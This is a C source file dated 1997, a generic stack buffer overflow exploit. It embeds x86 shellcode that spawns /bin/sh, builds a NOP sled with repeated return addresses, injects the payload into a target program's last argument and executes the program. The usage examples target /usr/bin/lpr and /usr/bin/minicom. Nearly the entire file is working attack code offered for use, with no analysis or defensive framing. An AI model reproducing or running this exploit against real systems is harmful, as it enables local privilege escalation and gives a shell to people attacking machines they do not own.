/* this stack overflow exploit code was written by jsn <jason@redline.ru>  */
/* provided "as is" and without any warranty. Sun Feb  9 08:12:54 MSK 1997 */
/* usage: argv[0] their_stack_offset buffer_size target_program [params]   */
/* generated string will be appended to the last of params.                */

/* examples: stack -600 1303 /usr/bin/lpr "-J"                             */
/*           stack -640 153  /usr/bin/minicom -t vt100 -d ""               */

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#define NOP     0x90

const char usage[] = "usage: %s stack-offset buffer-size argv0 argv1 ...\n";

extern          code();
void    dummy( void )
{
        extern  lbl();

        /* do "exec( "/bin/sh" ); exit(0)" */

__asm__( "
code:   xorl    %edx, %edx
        pushl   %edx
        jmp     lbl
start2: movl    %esp, %ecx
        popl    %ebx
        movb    %edx, 0x7(%ebx)
        xorl    %eax, %eax
        movb    $0xB, %eax
        int     $0x80
        xorl    %ebx, %ebx
        xorl    %eax, %eax
        inc     %eax
        int     $0x80
lbl:    call    start2
        .string \"/bin/sh\"
 ");
}

void            Fatal( int rv, const char *fmt, ... )
{
        va_list         vl;
        va_start( vl, fmt );
        vfprintf( stderr, fmt, vl );
        va_end( vl );
        exit( rv );
}

int             main( int ac, char **av )
{
        int             buff_addr;      /* where our code is */
        int             stack_offset = 0,
                        buffer_size = 0, i, code_size;
        char            *buffer, *p;

        buff_addr = (int)(&buff_addr);          /* get the stack pointer */
        code_size = strlen( (char *)code );     /* get the size of piece of */
                                                /* code in dummy()      */
        if( ac < 5 )    Fatal( -1, usage, *av );

        buff_addr -= strtol( av[ 1 ], NULL, 0 );
        buffer_size = strtoul( av[ 2 ], NULL, 0 );

        if( buffer_size < code_size + 4 )
            Fatal( -1, "buffer is too short -- %d minimum.\n", code_size + 5);
            /* "this is supported, but not implemented yet" ;) */

        if( (buffer = malloc( buffer_size )) == NULL )
            Fatal( -1, "malloc(): %s\n", strerror( errno ) );

        fprintf( stderr, "using buffer address 0x%8.8x\n", buff_addr );

        for( i = buffer_size - 4; i > buffer_size / 2; i -= 4 )
                *(int *)(buffer + i) = buff_addr;
        memset( buffer, NOP, buffer_size/2 );

        i = (buffer_size - code_size - 4)/2;

        memcpy( buffer + i, (char *)code, code_size );
        buffer[ buffer_size - 1 ] = '\0';

        p = malloc( strlen( av[ ac - 1 ] ) + code_size + 1 );
        if( !p )
            Fatal( -1, "malloc(): %s\n", strerror( errno ) );

        strcpy( p, av[ ac - 1 ] );
        strcat( p, buffer );
        av[ ac - 1 ] = p;

        execve( av[ 3 ], av + 3, NULL );
        perror( "exec():" );
}
